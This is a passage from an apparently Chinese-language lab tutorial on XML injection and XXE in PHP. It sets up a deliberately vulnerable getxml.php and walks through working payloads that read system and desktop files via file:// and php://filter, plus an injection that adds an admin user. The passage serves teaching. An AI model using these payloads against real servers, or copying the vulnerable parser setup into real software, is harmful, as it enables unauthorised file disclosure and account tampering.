class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><p>想要了解更详细的信息，可以访问php的官方文档：</p><p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a><strong>什么是XML</strong></h2><p>eXtensible Markup Language,可扩展标记语言，使用简单的标记来描述数据。是一种非常灵活的语言,类似于HTML语言，但是并没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML一样显示数据。xml不会做任何事情，它是被设计用来结构化、存储以及传输信息，也就是xml文件所携带的信息，需要被其他的语言或者程序来解析，才能发挥作用。</p><h2 id="XML的用处"><a href="#XML的用处" class="headerlink" title="XML的用处"></a><strong>XML的用处</strong></h2><p>通常，xml被用于信息的记录和传递(比如，数据库的导出导入会很麻烦，但是xml会很方便)，也会被用于充当配置文件。也会被应用于Web 开发的许多方面，常用于简化数据的存储和共享。如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; XML 把数据从 HTML 分离，更方便再HTML文档中显示动态数据。</span><br><span class="line">b&gt; XML 简化数据共享，XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。这让创建不同应用程序可以共享的数据变得更加容易。</span><br><span class="line">c&gt; XML 简化数据传输，由于可以通过各种不兼容的应用程序来读取数据，以 XML 交换数据降低了不兼容系统之间交换书据的复杂性。</span><br><span class="line">d&gt; XML 简化平台变更，使用XML存储一些不兼容的数据，可以在系统或软件升级，转换大量的数据时，避免数据的丢失。</span><br><span class="line">e&gt; XML 使您的数据更有用，XML可以使不同的应用程序都能够访问您的数据，使得数据的用途更广。</span><br><span class="line">f&gt; XML 用于创建新的互联网语言，如XHTML、WSDL、WAP 和 WML、RSS 、RDF 和 OWL等</span><br></pre></td></tr></table></figure><h2 id="什么是XML注入"><a href="#什么是XML注入" class="headerlink" title="什么是XML注入"></a><strong>什么是XML注入</strong></h2><p>比如：一个 web 应用，使用进行用户注册时，选择以 xml 来存储数据到 xmldb 数据库中，当用户填写用户名，密码和邮箱时，后台存储的文件格式及内容如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding:=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user_name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user_name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_pass</span>&gt;</span>111111<span class="tag">&lt;/<span class="name">user_pass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_email</span>&gt;</span>admin@test.com<span class="tag">&lt;/<span class="name">user_email</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>那么攻击者就可以在注册的时候构造恶意的数据，假设他在用户名与密码的输入框中输入正常的文本，在最后的邮箱输入框中输入如下内容：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">user_email</span>&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">user_name</span>&gt;</span>admin1<span class="tag">&lt;/<span class="name">user_name</span>&gt;</span><span class="tag">&lt;<span class="name">user_pass</span>&gt;</span>111111<span class="tag">&lt;/<span class="name">user_pass</span>&gt;</span><span class="tag">&lt;<span class="name">user_email</span>&gt;</span>admin1@test.com<span class="tag">&lt;/<span class="name">user_email</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们看一看这段恶意的输入内容，先是把第一个注册的用户邮箱标签闭合，然后把用户标签闭合，再新建一个完整的用户标签，最后再把最后的没有任何内容的用户标签闭合，那么当这段内容到达xmldb数据中时，就会多注册一个名为admin1的用户。</p><p>综合上面的小例子，我么可以知道,能够进行XML注入攻击的前提是，用户能够控制数据的输入，程序没有对输入的内容进行过滤且拼接了数据。那么相应的，破坏掉其中一个前提就可以进行防御了，既然我们无法限制用户的输入，那么就可以对数据进行过滤，将XML语言本身的“保留字符”进行过滤或者转意即可。</p><h2 id="什么是XXE注入漏洞："><a href="#什么是XXE注入漏洞：" class="headerlink" title="什么是XXE注入漏洞："></a><strong>什么是XXE注入漏洞：</strong></h2><p>XXE注入也是XML注入的一部分，但相较于普通的XML注入，XXE注入的攻击面更广，危害更大。</p><p><strong>XXE注入</strong>(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，所注入的对象就是XML语言中的一个的重点： XML外部实体。当遇见能够解析XML内容的页面时，如果能注入外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。</p><p>XXE的攻击形式主要分为：带内数据实体注入、基于错误的实体注入和带外数据实体注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">带内数据实体注入：in-band ,XML解析后的数据会直接显示在屏幕上</span><br><span class="line">基于错误的实体注入：error-based，解析结果只有一大堆的错误</span><br><span class="line">带外数据实体注入：out-of-band，也叫XXE盲注，注入的XML解析后无任何输出响应，必须执行一些带外请求吧数据提取出来。</span><br></pre></td></tr></table></figure><h2 id="XXE注入能做什么："><a href="#XXE注入能做什么：" class="headerlink" title="XXE注入能做什么："></a><strong>XXE注入能做什么：</strong></h2><p>a&gt; 任意文件读（本实验重点）</p><p>b&gt; SSRF，服务端请求伪造，借助漏洞实现内网探测，比如内网的存活主机、开放端口等</p><p>c&gt; DOS攻击</p><p>d&gt; 远程命令执行</p><h2 id="PHP的XXE注入产生的条件"><a href="#PHP的XXE注入产生的条件" class="headerlink" title="PHP的XXE注入产生的条件"></a><strong>PHP的XXE注入产生的条件</strong></h2><p>a&gt; Libxml的版本尽可能的低，libxml是PHP的xml解析库，因为从2.8.0版本开始，libxml默认是不加载外部实体的，如果要使用较高版本的libxml的话，需要在编写代码的时候对参数做设置。</p><p>b&gt; 目标主机没有禁用外部实体的引用。</p><p>c&gt; 用户可以控制xml的输入内容</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>系统类型： Windows7_x64</p><p>IP地址： 192.168.0.3</p><p>所用软件： phpstudy、BurpSuite、ncat</p><p>实验内容主要分为四个部分：</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p>1． XML基础必备</p><p>2． 有回显的本地文件读取（In-band 带内数据实体注入）。</p><p>3． 无回显的本地文件读取（OOB out-of-band 外带参数实体注入）。</p><p>4． PHP中的XXE注入漏洞的其他利用方式</p><h3 id="XML基础必备"><a href="#XML基础必备" class="headerlink" title="XML基础必备"></a>XML基础必备</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding:=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user_name</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user_name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_pass</span>&gt;</span>111111<span class="tag">&lt;/<span class="name">user_pass</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user_email</span>&gt;</span>admin@test.com<span class="tag">&lt;/<span class="name">user_email</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Users</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如上代码，第一行是XML文档的声明，由“<?xml”开头，以“?>”结尾，其中的内容是对本xml文档所使用的版本 “version”和编码“encoding”的声明，version一般情况下都是1.0，因为目前为止，xml只有这一个版本。</p><p>从第三行开始，就是XML文档的主要内容了，如代码中所示的“<Users>”，是本文档的根元素，“<user>”是“<Users>”的子元素，而“<user_name>、<user_pass>、<user_email>”也都是子元素，但是是“<book>”的子元素。</p><h4 id="XML的格式"><a href="#XML的格式" class="headerlink" title="XML的格式"></a><strong>XML的格式</strong></h4><p>a&gt;. 声明信息，用于描述xml的版本及编码格式。**<?**xml version="1.0" encoding="utf-8" **?>**</p><p>b&gt;. xml有且仅有一个根元素（可以理解为顶级的元素、没有被其他元素包起来的元素）。</p><p>c&gt;. xml中大小写敏感</p><p>d&gt;. 标签是成对出现的，所有元素都必须有一个关闭标签，而且要正确嵌套。</p><p>e&gt;. 属性值要使用双引号,比如某标签有个id属性，那么id的值需要使用双引号</p><p>f&gt;. 注释的写法。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1--&gt;</span></span><br></pre></td></tr></table></figure><p>g&gt;. 一个格式良好的xml文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;books&gt;</span><br><span class="line">    &lt;book id=&quot;b01&quot;&gt;</span><br><span class="line">        &lt;name&gt;Python黑客编程从入门到入狱&lt;/name&gt;</span><br><span class="line">        &lt;author&gt;张三&lt;/author&gt;</span><br><span class="line">        &lt;price&gt;$20.00&lt;/price&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&lt;/books&gt;</span><br></pre></td></tr></table></figure><p>h&gt;. XML并不是让用户直接打开的，而是让别的语言来从文件中读取信息的。至于为什么可以直接用浏览器浏览，只是部分浏览器可以识别而已。</p><h4 id="XML的属性"><a href="#XML的属性" class="headerlink" title="XML的属性"></a><strong>XML的属性</strong></h4><p>虽然XML像HTML一样，也有属性，但是一般不推荐使用属性，如果某个信息看起来很像是数据，那么最好是使用元素来表示它，而不是属性。</p><h4 id="XML验证"><a href="#XML验证" class="headerlink" title="XML验证"></a><strong>XML验证</strong></h4><p>拥有正确语法的 XML 被称为”形式良好”的 XML。而判断XML的语法是否合法，叫做XML验证，是通过 DTD进行验证的。</p><p>DTD：Document Type Definition 文档类型定义。用于约束xml的文档格式，保证xml是一个有效的xml，DTD分为内部和外部两种。DTD定义在xml文件中视为内部DTD；DTD定义在外部的dtd文件中，视为外部DTD。</p><p>说的简单一点，DTD就是对当前的XML文档定义一些规则，比如这个XML文档中的根元素是什么，有几个子元素，每个子元素能出现几次，哪些元素有属性，属性的类型是什么，属性的默认值是什么等等，如果后面的XML内容中，与DTD中的定以不符，如元素个数不符、元素名称大小写不符等，那么XML文件解析时就会报错。</p><h4 id="内部DTD的使用："><a href="#内部DTD的使用：" class="headerlink" title="内部DTD的使用："></a><strong>内部DTD的使用：</strong></h4><h5 id="内部DTD的定义"><a href="#内部DTD的定义" class="headerlink" title="内部DTD的定义"></a><strong>内部DTD的定义</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h5 id="元素声明语法"><a href="#元素声明语法" class="headerlink" title="元素声明语法"></a><strong>元素声明语法</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&lt;!ELEMENT 根元素 (子元素)&gt;</span><br><span class="line">&lt;!ELEMENT 根元素的子元素 (子元素的子元素，子元素的子元素)&gt;</span><br><span class="line">&lt;!ELEMENT 子元素 (数据类型)&gt;</span><br><span class="line">&lt;!ELEMENT 子元素 (数据类型)&gt;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h5 id="元素声明中的数量词"><a href="#元素声明中的数量词" class="headerlink" title="元素声明中的数量词"></a><strong>元素声明中的数量词</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;+&quot; 表示出现一次或者多次</span><br><span class="line">&quot;?&quot;表示出现0次或多次</span><br><span class="line">&quot;*&quot;表示出现任意次。</span><br></pre></td></tr></table></figure><h5 id="属性声明语法"><a href="#属性声明语法" class="headerlink" title="属性声明语法"></a><strong>属性声明语法</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ATTLIST 元素名称 属性名称  属性类型 默认值&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!--注释--&gt;</span><br><span class="line">&lt;!DOCTYPE books [</span><br><span class="line">&lt;!ELEMENT books (book+)&gt;</span><br><span class="line">&lt;!ELEMENT book (name,author price)&gt;</span><br><span class="line">&lt;!ATTLIST book id CDATA #REQUIRED&gt;</span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT author (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT price (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;books&gt;</span><br><span class="line">&lt;book id=&quot;b01&quot;&gt;</span><br><span class="line">    &lt;name&gt;a&lt;/name&gt;</span><br><span class="line">        &lt;author&gt;张三&lt;/author&gt;</span><br><span class="line">        &lt;price&gt;$1.00&lt;/price&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&lt;/books&gt;</span><br></pre></td></tr></table></figure><p>如上，就是一个内部DTD的引用示例，在DTD定义中，要求根元素books的子元素book出现一次及以上，子元素book又有三个子元素，分别为name，author和price，然后声明了元素book的id属性，其类型时CDATA，并且是必须的（#REQUIRED），最后定义了book的三个子元素的数据类型为#PCDATA，这表示这三个元素标签中的内容必须为文本，不能再出现子标签。</p><h4 id="外部DTD的使用："><a href="#外部DTD的使用：" class="headerlink" title="外部DTD的使用："></a><strong>外部DTD的使用：</strong></h4><p>首先需要创建一个外部的dtd文件。内容中不需要包括&lt;!DOCTYPE…&gt;，直接&lt;!ELEMENT…&gt;，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!ELEMENT books (book+)&gt;</span><br><span class="line">&lt;!ELEMENT book ( name,author,price)&gt;</span><br><span class="line">&lt;!ATTLIST book id CDATA #REQUIRED&gt;</span><br><span class="line">&lt;!ELEMENT name (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT author (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT price (#PCDATA)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在XML文档中引入外部的DTD：</p><!DOCTYPE books SYSTEM "xxx.dtd"><p>注意外部实体引用时的关键字“SYSTEM”，同时也可以使用“PUBLIC”这个关键字，这两者的区别在于，SYSTEM表示私有的DTD，PUBLIC表示共有的DTD。</p><h4 id="DTD实体（重点学习）"><a href="#DTD实体（重点学习）" class="headerlink" title="DTD实体（重点学习）"></a><strong>DTD实体（重点学习）</strong></h4><p>首先，什么是DTD实体，简单点理解，实体就像是变量，可以用于存储数据，以便后续的使用。但它的功能又不仅仅是存储，比如外部实体，除了可以存储数据，还可以从远程文件或远程网络中读取内容或调用数据。</p><p>从实体被定义的位置来看，实体可以分为内部实体和外部实体，就像内部DTD和外部DTD一样，内部实体，就是在XML文档内部的DTD进行定义的实体，外部实体就是定义在外部DTD文件中然后被引用到当前XML中的实体。</p><p><strong>内部实体声明：</strong></p><p><strong>声明语法：</strong></p><!ENTITY 实体名称 "实体的值"><p>一个实体的引用，由三部分构成:&amp;符号, 实体名称, 分号。</p><p><strong>内部实体引用示例：</strong></p><p>我们可以在桌面上创建一个test.xml文件，将如下内容输入到文件中：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Test [</span><br><span class="line">&lt;!ENTITY test &quot;Hello World&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;Test&gt;&amp;test;&lt;/Test&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530102946971.png" alt="image-20240530102946971"></p><p>接下来我们使用PHP进行解析：</p><p>打开phpstudy的www目录,然后在该路径下新建一个php文件getxml.php（实验环境中已经创建好，在桌面demo&#x2F;PHP_XML&#x2F;step1下，getxml.php），将如下代码输入进去：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xml&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用浏览器进行访问getxml.php.直接访问可能会有报错，可能是因为我们还没有输入参数,然后我们将将前面的xml代码作为参数传入，可以不复制xml声明，<strong>记得要将引用实体时的“&amp;”手动编码为“%26”</strong>（因为我们这里使用的是GET传参的方式，所以传入的内容会被进行URL编码，但是&amp;在URL中被认为是两个参数的分隔符，所以如果我们不对其进行URL编码转换，浏览器会把它当作参数的分隔符来处理）：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530103234742.png" alt="image-20240530103234742"></p><p><strong>外部实体声明：</strong></p><p><strong>声明语法：</strong></p><!ENTITY 实体名称 SYSTEM "URI/URL"><p>声明一个外部实体的关键在于“SYSTEM”这个关键字。SYSTEM在此意图让xml解析器知道，现在声明的是一个外部实体，需要从后面的外部资源中获取内容并存储在内部实体，如果后面的外部资源的语法，存在特殊符号，那么xml解析器会报错。</p><p>外部实体引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，比如http、file、ftp等，具体内容如下所示：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530103307148.png" alt="image-20240530103307148"></p><p><strong>外部实体引用示例：</strong></p><p>实验环境中已经创建好以下文件，在桌面demo&#x2F;PHP_XML&#x2F;step1下，test2.xml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Test [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.3/out_test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> </span><br><span class="line">&lt;Test&gt;&amp;xxe;&lt;/Test&gt;</span><br></pre></td></tr></table></figure><p>我们可以看到，代码中引入了一个外部实体文件out_test.txt，意思就是将远程主机“<a href="http://192.168.0.3/%E2%80%9D%E7%9A%84out_test.txt%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E8%B5%8B%E5%80%BC%E7%BB%99%E5%AE%9E%E4%BD%93xxe%E3%80%82%E6%88%91%E4%BB%AC%E5%85%88%E5%9C%A8www%E7%9B%AE%E5%BD%95%E4%B8%8B%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAout_test.txt,%E5%90%8E%E9%9A%8F%E4%BE%BF%E5%86%99%E5%85%A5%E7%82%B9%E5%86%85%E5%AE%B9%E3%80%82">http://192.168.0.3/”的out_test.txt的文件内容赋值给实体xxe。我们先在www目录下创建一个out_test.txt,后随便写入点内容。</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">this is a text</span><br></pre></td></tr></table></figure><p>再次打开浏览器，访问getxml.php,将新的xml代码作为参数传入：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530103454208.png" alt="image-20240530103454208"></p><p>另外，从实体的引用方式来区分，实体又可以分为：一般实体、参数实体、预定义实体。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一般实体：General Entities，就是我们上面的示例中的实体，使用&amp;进行引用</span><br><span class="line"></span><br><span class="line">预定义实体：Predefined Entities，就是xml本身对一些特殊字符进行了预定义，方便用户直接引用，比如小于号&quot;&lt;&quot;，如果直接在xml文档中使用小于号，会被xml解析器视为标签，从而引起解析错误。那么此时就需要调用小于号所对应的预定义实体来引用：&lt;。</span><br><span class="line"></span><br><span class="line">参数实体：Parameter Entities，这也是XXE学习中的重点，在XXE利用中经常被使用。</span><br></pre></td></tr></table></figure><p><strong>参数实体</strong></p><p><strong>参数实体声明：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内部：&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;</span><br><span class="line">外部：&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体应注意以下几点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 “%实体名;” 引用</span><br><span class="line">(2) 只有在 DTD 文件中，参数实体的声明才能引用其他实体</span><br><span class="line">(3) 和通用实体一样，参数实体也可以外部引用</span><br></pre></td></tr></table></figure><p>简单理解呢，就是参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在当前xml文件的DTD声明中，或者是当前的DTD文件中。</p><p>参数实体引用示例（实验环境中已经创建好，在桌面demo&#x2F;PHP_XML&#x2F;step1下，test3.xml）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!-- 参数实体 --&gt;</span><br><span class="line">&lt;!DOCTYPE Test [</span><br><span class="line">&lt;!ENTITY  % par &quot;&lt;!ENTITY hello &#x27;hello para entities&#x27;&gt;&quot;&gt;</span><br><span class="line">%par;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;Test&gt;&amp;hello;&lt;/Test&gt;</span><br></pre></td></tr></table></figure><p>像上图这样一个xml文档，我们定义了一个参数实体为par，他的值比较特殊，是一句普通实体的声明，然后是在DTD中使用“%par;”进行引用，最后在xml文档内容中使用“&amp;hello”来引用定义的普通实体hello。所以这个时候，我们直接使用浏览器查看的时候，会是下面的显示：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530111305856.png" alt="image-20240530111305856"></p><p>我们还是使用之前的getxml.php：</p><p>测试用的payload，也就是我们所要传的参数（记得在浏览器传参时将&amp;转义为%26）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>这是利用file协议来直接读取windows的系统配置文件，结果为：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530112335516.png" alt="image-20240530112335516"></p><p>但是这样也不代表这个payload的就适用于任何情况，比如我们更换一个读取的文件xmlerror.txt，内容是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;this is a test&gt;&amp;&lt;##</span><br></pre></td></tr></table></figure><p>随便给他放个位置，我这里放在桌面上，我们再使用刚才的payload测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>随便给他放个位置，我这里放在桌面上，我们再使用刚才的payload测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530112606820.png" alt="image-20240530112606820"></p><p>这个时候就会如上图一样，报很多错误，主要是因为我们要读取的文件内容中存在很多的特殊字符：大于号、小于号等，我们在前面的XML基础中也提到过，当xml的标签内还存在小于号、大于号等特殊字符时，尤其是小于号，会被XML解析器误认为是另一个标签的开始，这样就会造成解析的错误。</p><p>所以我们就要想办法绕过。我们这里提供两种绕过办法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. php伪协议</span><br><span class="line">2. XML CDATA</span><br></pre></td></tr></table></figure><p>我们先使用伪协议进行读取，使用的payload如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=C:/Users/Administrator/Desktop/xmlerror.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;%26xxe;&lt;/root&gt;</span><br><span class="line">#PHRoaXMgaXMgYSB0ZXN0PiY8IyM=</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530112746123.png" alt="image-20240530112746123"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530112824450.png" alt="image-20240530112824450"></p><p>进行base64解码后，就是文件的内容</p><p>接下来，我们利用CDATA进行内容的读取：</p><p>需要先了解一下XML CDATA，默认情况下，XML文档中的文本都会被XML解析器解析，但是会忽略CDATA区段中的文本。</p><p>我们看下W3school提供的CDATA使用方式：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530113037168.png" alt="image-20240530113037168"></p><p>从w3school给出的例子，我们也大概知道了CDATA的使用方式，但是其还需要注意几点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a&gt; CDATA 部分不能包含字符串 &quot;]]&gt;&quot;。也不允许嵌套的 CDATA 部分，这样会导致异常的闭合，从而使解析器报错。</span><br><span class="line">b&gt; 标记 CDATA 部分结尾的 &quot;]]&gt;&quot; 不能包含空格或换行。</span><br></pre></td></tr></table></figure><p>那么了解了这些，我们就可以尝试使用CDATA再次去读取目标文件的内容，我们首先需要把要读取的到的内容放在CDATA中，但是CDATA并没有提供拼接的方法，所以我们需要去尝试，我们这里暂且使用普通实体进行拼接尝试<strong>（注意是尝试）</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">   &lt;!ENTITY end &quot;]]&gt;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&amp;start;&amp;xxe;&amp;end;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>我们的想法是这样的，将CDATA的格式内容写在start和end两个实体里面，然后在调用实体的时候，先后调用三个实体，将实体内容进行拼接，拼接后的内容被XML解析器解析。但是测试失败：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530113409608.png" alt="image-20240530113409608"></p><p>这说明我们的拼接方式不可行，我们现在使用的是一般实体，我们在前面的xml基础知识中介绍过了，一般实体的引用是在xml文档内容中，既然在xml文档内容中拼接不可行，那在dtd中拼接可行吗？我们再次进行尝试，既然再dtd中拼接，那就需要用到参数实体了。</p><p>我们再次尝试构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">   &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % xxe SYSTEM &quot;file:///C:\Users\Administrator\Desktop\xmlerror.txt&quot;&gt;</span><br><span class="line">   &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">   &lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;all;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240530113535516.png" alt="image-20240530113535516"></p><p>理论上，我们完美地将这几个参数实体拼接了起来，并将值赋给了一般实体all，但是遗憾的是，我们的payload还是报错了：</p><p>那么这又是为什么呢？根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语言中”，这是什么意思呢？就是不能在实际的标记语言中来调用参数实体，像我们这样，就是在标记语言中进行调用，他需要在DTD中单独来调用：</p><p><img 